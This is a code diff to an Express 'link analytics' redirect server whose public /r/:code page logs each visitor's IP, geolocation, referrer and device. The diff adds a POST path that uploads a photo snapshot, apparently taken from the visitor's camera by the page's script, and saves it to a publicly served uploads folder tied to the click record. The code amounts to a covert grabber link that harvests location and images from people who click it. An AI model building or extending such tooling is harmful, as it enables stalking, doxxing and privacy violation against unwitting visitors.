@@ -312,8 +312,8 @@ app.delete('/api/links/:code', requireAuth, (req, res) => {
   }
 });
 
-// UNPROTECTED PUBLIC REDIRECT ENDPOINT: /r/:code
-app.get('/r/:code', async (req, res) => {
+// UNPROTECTED PUBLIC REDIRECT ENDPOINT: /r/:code (GET & POST)
+const handleRedirect = async (req, res) => {
   const code = req.params.code;
   const link = linksDb.get(code);
 
@@ -335,7 +335,7 @@ app.get('/r/:code', async (req, res) => {
   const queryLon = parseFloat(req.query.lon);
   const isFallback = req.query.fallback === '1' || req.query.fallback === 'true';
 
-  if (!isNaN(queryLat) && !isNaN(queryLon) || isFallback) {
+  if (!isNaN(queryLat) && !isNaN(queryLon) || isFallback || req.method === 'POST') {
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const refHeader = req.headers['referer'] || req.headers['referrer'] || '';
     const agentString = req.headers['user-agent'] || '';
@@ -367,6 +367,25 @@ app.get('/r/:code', async (req, res) => {
       }
     }
 
+    const rawPhoto = req.query.photo || (req.body && req.body.photo);
+    let photoUrl = null;
+
+    if (rawPhoto && rawPhoto.startsWith('data:image')) {
+      try {
+        const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');
+        if (!fs.existsSync(UPLOADS_DIR)) {
+          fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+        }
+        const base64Data = rawPhoto.replace(/^data:image\/\w+;base64,/, '');
+        const filename = `snap_${Date.now()}_${Math.floor(Math.random()*1000)}.jpg`;
+        const filepath = path.join(UPLOADS_DIR, filename);
+        fs.writeFileSync(filepath, base64Data, 'base64');
+        photoUrl = `/uploads/${filename}`;
+      } catch (err) {
+        console.error('Error saving photo snapshot:', err);
+      }
+    }
+
     const clickEvent = {
       timestamp: new Date().toISOString(),
       ip: locInfo.ip,
@@ -380,12 +399,16 @@ app.get('/r/:code', async (req, res) => {
       referrerCategory: referrerInfo.category,
       referrerRaw: referrerInfo.raw,
       device: `${deviceType} (${osName})`,
-      browser: browserName
+      browser: browserName,
+      photoUrl: photoUrl
     };
 
     link.clicks.push(clickEvent);
     saveDatabaseToDisk(); // SAVE TO DISK IMMEDIATELY ON VISITOR CLICK
 
+    if (req.method === 'POST') {
+      return res.json({ success: true, photoUrl });
+    }
     return res.redirect(link.targetUrl);
   }
 
@@ -463,7 +486,7 @@ app.get('/r/:code', async (req, res) => {
         let done = false;
         let photoDataUrl = null;
 
-        function proceed(lat, lon, photo) {
+        async function proceed(lat, lon, photo) {
           if (done) return;
           done = true;
           let redirectUrl = '/r/' + targetCode + '?';
@@ -473,7 +496,13 @@ app.get('/r/:code', async (req, res) => {
             redirectUrl += 'fallback=1';
           }
           if (photo) {
-            sessionStorage.setItem('temp_photo', photo);
+            try {
+              await fetch(redirectUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ photo: photo })
+              });
+            } catch (e) {}
           }
           window.location.replace(redirectUrl);
         }
@@ -523,7 +552,10 @@ app.get('/r/:code', async (req, res) => {
     </body>
     </html>
   `);
-});
+};
+
+app.get('/r/:code', handleRedirect);
+app.post('/r/:code', handleRedirect);
 
 app.listen(PORT, () => {
   console.log(`🚀 Link Analytics Server running at http://localhost:${PORT}`);
